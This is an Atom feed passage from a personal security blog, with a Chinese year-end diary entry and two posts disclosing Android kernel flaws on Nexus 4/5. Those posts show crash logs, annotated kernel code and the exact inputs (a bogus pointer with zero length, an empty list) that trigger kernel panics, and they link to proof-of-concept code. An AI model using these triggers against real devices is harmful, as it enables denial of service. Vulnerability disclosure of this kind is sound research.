<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[idhyt's blog]]></title>
  <subtitle><![CDATA[云淡风轻]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://blog.idhyt.com/"/>
  <updated>2017-01-01T17:56:40.000Z</updated>
  <id>http://blog.idhyt.com/</id>
  
  <author>
    <name><![CDATA[idhyt]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[我的2016]]></title>
    <link href="http://blog.idhyt.com/2017/01/01/diary-annual-summary-2016/"/>
    <id>http://blog.idhyt.com/2017/01/01/diary-annual-summary-2016/</id>
    <published>2017-01-01T03:15:11.000Z</published>
    <updated>2017-01-01T17:56:40.000Z</updated>
    <content type="html"><![CDATA[<p>&#160; &#160; &#160; &#160;昨晚同事一起吃了饭然后打算去市区感受一下跨年气氛，由于我们都喝了酒，就让一个女生开车，晃晃悠悠的一走二停三熄火愣是在车上跨了个年。新年第一天去朋友家里玩了一天还挺开心的，10来个人做了一大桌菜胡吃海喝的，突然想起来之前在珠海和同事一起吃火锅的时候，也是在家里一大桌人边吃边吐槽公司，慢慢的大家都分散到各个地方了，平时没事真的应该多聚一聚，吃个饭聊聊天都挺好，真的不能想着反正大家都在一个城市，以后时间多慢慢聚，从我最近聚的几次来看，脱到最后大家聚一起的时候，基本都是有人要离开的时候。</p>
<hr>

<p>&#160; &#160; &#160; &#160;其实今年本来不打算写总结了的，后来想想还是记录一下吧，以后回想起来也能有个时间轴，今年对我来说还是挺重要的。年初认真思考了一下工作的事情，其实也是考虑蛮久了，然后辞了第一份工作，当时我只是觉得自己做了在那个时间点该做的决定，所以也没留下什么遗憾，只是突然离开了长期生活的地方还是会有点懵逼。之后自己来了一场说走就走的旅行，出去了一个多月，把想去的地方都逛了一下，回了一趟家，然后换了下一份工作。工作过后跳槽和刚毕业择业已经有了质的不同，刚毕业基本觉得公司和薪资ok就可以了，至于做什么其实是没有太多概念的，都是到公司后按需求走的，工作过后跳槽就有了明确的目标和方向，所以也没有投几家公司，最后选择的offer还算满意，工作环境和工作内容基本都符合了我的预期。其实学东西最快的时候是在入职的半年里，很多东西都是由不知到知的过程，会觉得每天都有新的事情要做，每天都有新的问题要解决，仿佛回到了刚毕业时候求知欲特别旺盛的状态，然后每天下班后还坚持跑5公里再回家，回家冲个澡坐在阳台上想一些事情真是格外精神，我以为我可以安下心来在这里好好沉淀一下，不管是思维模式还是技术方面，可是啊，人生总是充满了意外，半年后我再次离职了。</p>
<hr>

<p>&#160; &#160; &#160; &#160;曾经我想过无数种可能以后将要工作和定居的地方，却没有料到我竟然又回到了成都，可能冥冥之中吧，有好多的如果，促使成这样一个结果，我觉得应该是值得庆幸的事情。可能没有这么多如果我的人生会是另外一个支线，但我相信我的这个选择对我来说会更有意义一些，其实仔细想想呢，人生苦短，想那么多干嘛，在对的时间做自认为对的决定，时间就是最好的证明。</p>
<hr>

<p>&#160; &#160; &#160; &#160;太多生活琐事就不记录了，2016年我对生活和工作又有了很多的想法和见解，是我思想和心智转变比较多的一年，2017年将会是充满疑惑和忙碌的一年，我希望在这一年中，自己能够成为自己想要成为的模样的同时发现更多更好玩的事情。虽然每年这个时候想的愿望都没能实现，但是愿望还是要有的，心诚则灵万一实现了呢。新的一年我希望家人和朋友身体健康，每天都开开心心，年底之前都能实现自己的愿望。</p>
<hr>


<p>&#160; &#160; &#160; &#160;最后，我希望我的生活和我的朋友，其淡如水，久尝而不腻。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>&#160; &#160; &#160; &#160;昨晚同事一起吃了饭然后打算去市区感受一下跨年气氛，由于我们都喝了酒，就让一个女生开车，晃晃悠悠的一走二停三熄火愣是在车上跨了个年。新年第一天去朋友家里玩了一天还挺开心的，10来个人做了一大桌菜胡吃海喝的，突然想起来之前在]]>
    </summary>
    
      <category term="无法描述" scheme="http://blog.idhyt.com/tags/%E6%97%A0%E6%B3%95%E6%8F%8F%E8%BF%B0/"/>
    
      <category term="diary" scheme="http://blog.idhyt.com/categories/diary/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[KERNEL SECURITY FLAWS (0day for nexus4)]]></title>
    <link href="http://blog.idhyt.com/2016/11/09/exploit-kernel-security-flaws/"/>
    <id>http://blog.idhyt.com/2016/11/09/exploit-kernel-security-flaws/</id>
    <published>2016-11-09T15:28:11.000Z</published>
    <updated>2017-01-02T08:55:38.000Z</updated>
    <content type="html"><![CDATA[<p>About a month ago, when I was looking at the android kernle source code, I found a strange logic, it could trigger the device crash by bypassing the detection logic. I test it in Nexus 4 and the security patch level is 20161005.</p>
<a id="more"></a>
<p>The last_kmsg:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[  510.188720] Unable to handle kernel paging request at virtual address 40404040</span><br><span class="line">[  510.188873] pgd = e453c000</span><br><span class="line">[  510.188934] [40404040] *pgd=00000000</span><br><span class="line">[  510.189422] Internal error: Oops: 5 [#1] PREEMPT SMP ARM</span><br><span class="line">[  510.189575] CPU: 0    Not tainted  (3.4.0-cyanogenmod-g756c08a #1)</span><br><span class="line">[  510.189636] PC is at memcmp+0x14/0x34</span><br><span class="line">[  510.189727] LR is at iw_set_band_config+0x2c/0x58</span><br><span class="line">[  510.189849] pc : [&lt;c037573c&gt;]    lr : [&lt;c0615260&gt;]    psr: 80000013</span><br><span class="line">[  510.189849] sp : e6567e44  ip : 00000000  fp : c09864e8</span><br><span class="line">[  510.190032] r10: c0615234  r9 : 00000001  r8 : c09c94e8</span><br><span class="line">[  510.190124] r7 : 0000004b  r6 : 00000000  r5 : 40404040  r4 : 40404040</span><br><span class="line">[  510.190246] r3 : 00000000  r2 : 00000008  r1 : c0b7ef56  r0 : 40404040</span><br><span class="line">[  510.190368] Flags: Nzcv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user</span><br><span class="line">[  510.190429] Control: 10c5787d  Table: a633c06a  DAC: 00000015</span><br><span class="line">[  510.190551]</span><br><span class="line">[  510.190582] PC: 0xc03756bc:</span><br><span class="line">[  510.190704] 56bc  e3520000 1afffff3 e3a00001 e8bd8010 e5d03000 e353004e 0a00000e </span><br><span class="line">...</span><br><span class="line">[  510.232727] [&lt;c037573c&gt;] (memcmp+0x14/0x34) from [&lt;c0615260&gt;] (iw_set_band_config+0x2c/0x58)</span><br><span class="line">[  510.232788] [&lt;c0615260&gt;] (iw_set_band_config+0x2c/0x58) from [&lt;c08bcdf8&gt;] (ioctl_private_call+0xdc/0x278)</span><br><span class="line">[  510.232940] [&lt;c08bcdf8&gt;] (ioctl_private_call+0xdc/0x278) from [&lt;c08bc788&gt;] (wext_handle_ioctl+0x1cc/0x1e4)</span><br><span class="line">[  510.233062] [&lt;c08bc788&gt;] (wext_handle_ioctl+0x1cc/0x1e4) from [&lt;c078cb6c&gt;] (dev_ioctl+0x65c/0x6a0)</span><br><span class="line">[  510.233215] [&lt;c078cb6c&gt;] (dev_ioctl+0x65c/0x6a0) from [&lt;c0232288&gt;] (vfs_ioctl+0x28/0x3c)</span><br><span class="line">[  510.233337] [&lt;c0232288&gt;] (vfs_ioctl+0x28/0x3c) from [&lt;c0232ccc&gt;] (do_vfs_ioctl+0x484/0x574)</span><br><span class="line">[  510.233428] [&lt;c0232ccc&gt;] (do_vfs_ioctl+0x484/0x574) from [&lt;c0232e04&gt;] (sys_ioctl+0x48/0x74)</span><br><span class="line">[  510.233551] [&lt;c0232e04&gt;] (sys_ioctl+0x48/0x74) from [&lt;c0105a00&gt;] (ret_fast_syscall+0x0/0x30)</span><br><span class="line">[  510.233673] Code: e3a03000 e1a05000 e1530002 0a000005 (e7d54003)</span><br><span class="line">[  510.245880] ---[ end trace 8731deb30c10132d ]---</span><br><span class="line">[  510.246643] Kernel panic - not syncing: Fatal exception</span><br><span class="line">[  511.518859] wcnss_8960: crash shutdown : 0</span><br><span class="line">[  515.030487] Rebooting in 5 seconds..</span><br><span class="line">[  520.046020] Going down for restart now</span><br><span class="line">[  520.046325] in panic</span><br><span class="line"></span><br><span class="line">No errors detected</span><br><span class="line">Boot info:</span><br><span class="line">Last boot reason: kernel_panic</span><br></pre></td></tr></table></figure>
<p>so I write a <a href="https://github.com/idhyt/android_kernel_poc/blob/master/no_fix/wlan_hdd_wext.c" target="_blank" rel="external">POC</a> and report this security issue to google.</p>
<p>Soon, I received a reply.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Hey,</span><br><span class="line"></span><br><span class="line">The Nexus <span class="number">4</span> is no longer being supported and <span class="keyword">this</span> vulnerability does not affect any other Nexus devices. Closing issue.</span><br><span class="line"></span><br><span class="line">Thanks,</span><br><span class="line"></span><br><span class="line">Android Security Team</span><br></pre></td></tr></table></figure>
<p>I think they are not going to look at the root cause of the problem.</p>
<p>As we knows, the socket func could be called by ioctl, the ioctl last call func is ioctl_private_iw_point.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ioctl_private_iw_point</span><span class="params">(<span class="keyword">struct</span> iw_point *iwp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd,</span><br><span class="line">                  <span class="keyword">const</span> <span class="keyword">struct</span> iw_priv_args *descr,</span><br><span class="line">                  iw_handler handler, <span class="keyword">struct</span> net_device *dev,</span><br><span class="line">                  <span class="keyword">struct</span> iw_request_info *info, <span class="keyword">int</span> extra_size)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *extra;</span><br><span class="line">    <span class="keyword">int</span> err;</span><br><span class="line">    <span class="keyword">if</span> (IW_IS_SET(cmd)) &#123;   <span class="comment">// is set op</span></span><br><span class="line">        <span class="keyword">if</span> (!iwp-&gt;pointer &amp;&amp; iwp-&gt;length != <span class="number">0</span>)  <span class="comment">// set iwp-&gt;pointer = 0x40404040 &amp;&amp; iwp-&gt;length = 0, pass this check</span></span><br><span class="line">            <span class="keyword">return</span> -EFAULT;</span><br><span class="line">        <span class="keyword">if</span> (iwp-&gt;length &gt; (descr-&gt;set_args &amp; IW_PRIV_SIZE_MASK))</span><br><span class="line">            <span class="keyword">return</span> -E2BIG;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!iwp-&gt;pointer)</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    extra = kmalloc(extra_size, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!extra)</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If it is a SET, get all the extra data in here </span></span><br><span class="line">    <span class="keyword">if</span> (IW_IS_SET(cmd) &amp;&amp; (iwp-&gt;length != <span class="number">0</span>)) &#123;     <span class="comment">// pass this check because of iwp-&gt;length = 0</span></span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(extra, iwp-&gt;pointer, extra_size)) &#123;</span><br><span class="line">            err = -EFAULT;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Call the handler</span></span><br><span class="line">    <span class="comment">// pass all check but iwp-&gt;pointer is not valid, will casue a security issue.</span></span><br><span class="line">    err = handler(dev, info, (<span class="keyword">union</span> iwreq_data *) iwp, extra); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>when i set iwp-&gt;pointer = 0x40404040 &amp;&amp; iwp-&gt;length = 0 but not map 0x40404040,<br>it will pass all check like comment.<br>Once func uses this pointer（not map）and does not detect whether it is valid, it will casue a security issue. and this issue code logic (ioctl_private_iw_point) appeared in all kernel.</p>
<p>by chance, I found the proof in wlan_hdd_wext.c of nexus4.<br>all func listed below in wlan_hdd_wext.c module (nuxus4) will cause kernel panic.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">iw_set_priv,</span><br><span class="line">iw_qcom_set_wapi_mode, </span><br><span class="line">iw_set_keepalive_params, </span><br><span class="line">iw_set_packet_filter_params, </span><br><span class="line">iw_set_band_config,</span><br><span class="line">iw_set_dynamic_mcbc_filter,</span><br><span class="line">iw_setchar_getnone, </span><br><span class="line">iw_qcom_set_wapi_bkid,</span><br><span class="line">iw_set_host_offload</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>I gave them the root cause of the above problem. and I say, you can say is a security flaws and the next level func should check this pointer. I only give you a proof by wlan_hdd_wext.c module in nexus4, maybe other modules will appear later. After all, there are still a lot of careless programmers in the world. If you still believe that is not a security issue, i will public it in my blog or other social platform.</p>
<p>Soon, I received a reply.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Hey,</span><br><span class="line"></span><br><span class="line">We reviewed your latest comments and the code you reference is different in all our other Nexus devices. In those devices, there are adequate checks in place to prevent <span class="keyword">this</span> issue. We still believe <span class="keyword">this</span> is not a security issue.</span><br><span class="line"></span><br><span class="line">Thanks,</span><br></pre></td></tr></table></figure>
<p>so, it is really a sad story?</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>About a month ago, when I was looking at the android kernle source code, I found a strange logic, it could trigger the device crash by bypassing the detection logic. I test it in Nexus 4 and the security patch level is 20161005.</p>]]>
    
    </summary>
    
      <category term="exploit" scheme="http://blog.idhyt.com/categories/exploit/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[ILLEGAL ACCESS CAUSED BY AN EMPTY LIST]]></title>
    <link href="http://blog.idhyt.com/2016/10/26/exploit-illegal-access-caused-by-an-empty-list/"/>
    <id>http://blog.idhyt.com/2016/10/26/exploit-illegal-access-caused-by-an-empty-list/</id>
    <published>2016-10-26T15:24:11.000Z</published>
    <updated>2016-11-16T04:41:03.000Z</updated>
    <content type="html"><![CDATA[<p>Illegal access caused by an empty list. This problem is not repaired, I only test it in Nexus4 and Nexus5 with the security patch level 20161005. It will cause kernel panic.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ssize_t  <span class="title">msm_bus_dbg_update_request_write</span><span class="params">(<span class="keyword">struct</span> file *file,</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> __user *ubuf, size_t cnt, loff_t *ppos)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	...</span><br><span class="line">	list_for_each_entry(cldata, &amp;cl_list, <span class="built_in">list</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strstr</span>(chid, cldata-&gt;pdata-&gt;name)) &#123;</span><br><span class="line">			cldata = cldata;</span><br><span class="line">			strsep(&amp;chid, <span class="string">" "</span>);</span><br><span class="line">			<span class="keyword">if</span> (chid) &#123;</span><br><span class="line">				ret = strict_strtoul(chid, <span class="number">10</span>, &amp;index);</span><br><span class="line">				<span class="keyword">if</span> (ret) &#123;</span><br><span class="line">					MSM_BUS_DBG(<span class="string">"Index conversion"</span></span><br><span class="line">						<span class="string">" failed\n"</span>);</span><br><span class="line">					<span class="keyword">return</span> -EFAULT;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span></span><br><span class="line">				MSM_BUS_DBG(<span class="string">"Error parsing input. Index not"</span></span><br><span class="line">					<span class="string">" found\n"</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	msm_bus_dbg_update_request(cldata, index);</span><br><span class="line">	kfree(buf);</span><br><span class="line">	<span class="keyword">return</span> cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>LIST_HEAD(cl_list);</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> LIST_HEAD_INIT(name) &#123; &amp;(name), &amp;(name) &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> LIST_HEAD(name) \</span><br><span class="line">	struct list_head name = LIST_HEAD_INIT(name)</span></span><br></pre></td></tr></table></figure>
<p>if cl_list don’t have any node, prev and next is point to itself;</p>
<p>list_for_each_entry func:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> list_for_each_entry(pos, head, member)				\</span><br><span class="line">	for (pos = list_entry((head)-&gt;next, typeof(*pos), member);	\</span><br><span class="line">	     &amp;pos-&gt;member != (head); 	\</span><br><span class="line">	     pos = list_entry(pos-&gt;member.next, typeof(*pos), member))</span></span><br></pre></td></tr></table></figure>
<p>in this func, &amp;pos-&gt;member == (head);</p>
<p>now, see cldata struct:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> msm_bus_cldata *cldata;</span><br><span class="line"><span class="keyword">struct</span> msm_bus_cldata &#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">struct</span> msm_bus_scale_pdata *pdata;</span><br><span class="line">	<span class="keyword">int</span> index;</span><br><span class="line">	<span class="keyword">uint32_t</span> clid;</span><br><span class="line">	<span class="keyword">int</span> size;</span><br><span class="line">	<span class="keyword">struct</span> dentry *file;</span><br><span class="line">	<span class="keyword">struct</span> list_head <span class="built_in">list</span>;			<span class="comment">// offset 0x14</span></span><br><span class="line">	<span class="keyword">char</span> buffer[MAX_BUFF_SIZE];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>pos = list_entry((head)-&gt;next, typeof(*pos), member);<br>cldata = &amp;head - 0x14 = &amp;cl_list - 0x14;</p>
<p>in msm_bus_dbg_update_request func:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">msm_bus_dbg_update_request</span><span class="params">(<span class="keyword">struct</span> msm_bus_cldata *cldata, <span class="keyword">int</span> index)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((index &lt; <span class="number">0</span>) || (index &gt; cldata-&gt;pdata-&gt;num_usecases)) &#123;</span><br><span class="line">		MSM_BUS_DBG(<span class="string">"Invalid index!\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line">	ret = msm_bus_scale_client_update_request(cldata-&gt;clid, index);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>when access cldata-&gt;pdata-&gt;num_usecases, and cldata-&gt;pdata point to unknow address, it will cause kernel panic.</p>
<p>also, cl_list address is exports in nexus 5,<br>the cl_list address = 0xC1064F44,<br>so cldata = 0xC1064F44 - 0x14 = 0xC1064F30,<br>but cldata-&gt;pdata = [0xC1064F30] = 0,<br>so cldata-&gt;pdata-&gt;num_usecases will access address 0x4.</p>
<p>last_kmsg:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">[   58.790209] Unable to handle kernel NULL pointer dereference at virtual address 00000004</span><br><span class="line">[   58.790683] pgd = ea458000</span><br><span class="line">[   58.791290] [00000004] *pgd=32ab7831, *pte=00000000, *ppte=00000000</span><br><span class="line">[   58.792167] Internal error: Oops: 17 [#1] PREEMPT SMP ARM</span><br><span class="line">[   58.792585] CPU: 0    Not tainted  (3.4.0-gd59db4e #1)</span><br><span class="line">[   58.792844] PC is at msm_bus_dbg_update_request_write+0x164/0x22c</span><br><span class="line">[   58.793256] LR is at msm_bus_dbg_update_request_write+0xf0/0x22c</span><br><span class="line">[   58.793491] pc : [&lt;c01811c8&gt;]    lr : [&lt;c0181154&gt;]    psr: 60000013</span><br><span class="line">[   58.793505] sp : ea771f08  ip : 00000034  fp : ea771f3c</span><br><span class="line">[   58.794106] r10: c10d1278  r9 : ea770000  r8 : eb67ce40</span><br><span class="line">[   58.794511] r7 : 00000011  r6 : eb67ce40  r5 : c1065004  r4 : c1064ff0</span><br><span class="line">[   58.794742] r3 : 00000000  r2 : 00000061  r1 : 00000000  r0 : 00000000</span><br><span class="line">[   58.795152] Flags: nZCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user</span><br><span class="line">[   58.795556] Control: 10c5787d  Table: 3285806a  DAC: 00000015</span><br><span class="line">[   58.795782]</span><br><span class="line">[   58.795789] PC: 0xc0181148:</span><br><span class="line">[   58.796376] 1148  e1a00006 e5931008 eb09c65c e3500000 0afffff5 e24b0028 e59f10fc eb09c5cb</span><br><span class="line">[   58.798445] 1168  e51b0028 e3500000 0a000009 e3a0100a e24b202c eb09e506 e3500000 0a00000b</span><br><span class="line">[   58.800668] 1188  e1da3ab2 e3130004 1a000023 e3e0000d eaffffd1 e1da3bba e3130004 0a000003</span><br><span class="line">[   58.802891] 11a8  e59f10b8 e59f20b8 e59f00b8 eb0a1872 e51b102c e3510000 ba000003 e5943000</span><br><span class="line">[   58.804974] 11c8  e5933004 e1510003 da000006 e1da3db2 e3130004 1a00000b e1a00008 eb037a79</span><br><span class="line">[   58.807237] 11e8  e1a00007 eaffffbc e5940008 ebffec38 eafffff8 e59f0070 e59f1064 eb225d0c</span><br><span class="line">[   58.809497] 1208  e3e0000b eaffffb4 e59f1060 e59f2060 e59f0060 eb0a1858 eaffffee e59f0058</span><br><span class="line">[   58.811567] 1228  e59f1058 e59f2038 eb0a1853 e3e0000d eaffffa9 e3a03004 e28a0078 e58d3000</span><br><span class="line">[   58.813651]</span><br><span class="line">...</span><br><span class="line">[   58.957523]</span><br><span class="line">[   58.957530] R10: 0xc10d11f8:</span><br><span class="line">[   58.957944] 11f8  00000090 00000000 c0d0eb0c c0b07c58 c0d0eb1c c0d0eb90 00000098 00000000</span><br><span class="line">[   58.960189] 1218  c0d0eb0c c0b07c58 c0d0eb1c c0d0eb6c 000000ad 00000000 c0d0eb0c c0b07c70</span><br><span class="line">[   58.962412] 1238  c0d0eb1c c0d0ebe0 000000cb 00000000 c0d0eb0c c0b07c8c c0d0eb1c c0d0ebc4</span><br><span class="line">[   58.964503] 1258  00000043 00000000 c0d0eb0c c0b07c8c c0d0eb1c c0d0ebc4 0000004a 00000000</span><br><span class="line">[   58.966752] 1278  c0d0f328 c0b07ca8 c0d0f334 c0d0f564 000000b0 00000000 c0d0f328 c0b07cbc</span><br><span class="line">[   58.969009] 1298  c0d0f334 c0d0f53c 000000c1 00000000 c0d0f328 c0b07cd0 c0d0f334 c0d0f51c</span><br><span class="line">[   58.971269] 12b8  000000d2 00000000 c0d0f328 c0b07ce4 c0d0f334 c0d0f4fc 000000e2 00000000</span><br><span class="line">[   58.973357] 12d8  c0d0f328 c0b07cf8 c0d0f334 c0d0f44c 000000f2 00000000 c0d0f328 c0b07d0c</span><br><span class="line">[   58.975435] Process fuzz (pid: 3242, stack limit = 0xea7702f0)</span><br><span class="line">[   58.975846] Stack: (0xea771f08 to 0xea772000)</span><br><span class="line">[   58.976081] 1f00:                   ea2ef800 eb299548 00000000 eb67ce40 eb299540 00000011</span><br><span class="line">[   58.976503] 1f20: 000263eb ea771f78 00000011 00000000 ea771f6c ea771f40 c0264608 c0181070</span><br><span class="line">[   58.976745] 1f40: c026e744 c025f294 ea771f94 00000000 00000000 eb299540 000263eb 00000011</span><br><span class="line">[   58.977164] 1f60: ea771fa4 ea771f70 c0264774 c0264564 0002d4a4 00000000 00000000 00000000</span><br><span class="line">[   58.977581] 1f80: c0107544 0002d4a4 00000004 0000881d 00000004 c0107544 00000000 ea771fa8</span><br><span class="line">[   58.977999] 1fa0: c0107300 c0264738 0002d4a4 00000004 00000004 000263eb 00000011 00000000</span><br><span class="line">[   58.978238] 1fc0: 0002d4a4 00000004 0000881d 00000004 000080f4 00000000 00000000 be9fea9c</span><br><span class="line">[   58.978651] 1fe0: 0002bec8 be9fea40 000089ef 0000e654 20000010 00000004 00000000 00000000</span><br><span class="line">[   58.979111] [&lt;c01811c8&gt;] (msm_bus_dbg_update_request_write+0x164/0x22c) from [&lt;c0264608&gt;] (vfs_write+0xb0/0x154)</span><br><span class="line">[   58.979565] [&lt;c0264608&gt;] (vfs_write+0xb0/0x154) from [&lt;c0264774&gt;] (sys_write+0x48/0x80)</span><br><span class="line">[   58.979835] [&lt;c0264774&gt;] (sys_write+0x48/0x80) from [&lt;c0107300&gt;] (ret_fast_syscall+0x0/0x30)</span><br><span class="line">[   58.980261] Code: e51b102c e3510000 ba000003 e5943000 (e5933004)</span><br><span class="line">[   58.983832] ---[ end trace 114cfb12a6c4858a ]---</span><br><span class="line">[   58.985413] Kernel panic - not syncing: Fatal exception</span><br><span class="line">[   59.985839] Rebooting in 5 seconds..</span><br><span class="line">[   64.987517] Going down for restart now</span><br><span class="line">[   64.988789] Calling SCM to disable SPMI PMIC arbiter</span><br></pre></td></tr></table></figure></p>
<p><a href="https://github.com/idhyt/android_kernel_poc/blob/master/no_fix/msm_bus_dbg.c" target="_blank" rel="external">POC</a></p>
]]></content>
    <summary type="html">
